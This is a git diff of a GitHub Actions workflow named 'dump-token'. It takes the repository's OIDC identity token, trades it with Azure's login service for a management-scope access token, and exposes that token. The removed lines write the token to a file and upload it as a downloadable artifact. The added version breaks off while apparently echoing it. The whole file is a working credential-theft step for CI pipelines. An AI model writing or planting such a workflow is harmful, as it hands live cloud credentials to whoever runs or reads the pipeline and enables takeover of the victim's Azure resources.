@@ -1,15 +1,37 @@
-      - name: Exchange and dump token
+name: Get Azure Access Token
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  dump-token:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Get ID Token for Federated Identity
+        id: get_oidc
+        uses: actions/github-script@v6
+        with:
+          script: |
+            const id_token = await core.getIDToken("api://AzureADTokenExchange");
+            core.setOutput("id_token", id_token);
+
+      - name: Request Access Token from Azure
+        id: get_az_token
         run: |
+          ID_TOKEN="${{ steps.get_oidc.outputs.id_token }}"
+
           ACCESS_TOKEN=$(curl -s -X POST \
             -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${{ steps.oidc.outputs.id_token }}&scope=https://management.azure.com/.default" \
-            "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r .access_token)
+            -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=${ID_TOKEN}" \
+            -d "scope=https://management.azure.com/.default" \
+            "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r '.access_token')
 
-          echo "$ACCESS_TOKEN" > token.txt
-          echo "[+] Token written to token.txt"
-      
-      - name: Upload token.txt as artifact
-        uses: actions/upload-artifact@v3
-        with:
-          name: azure-access-token
-          path: token.txt
+          echo "$ACCESS
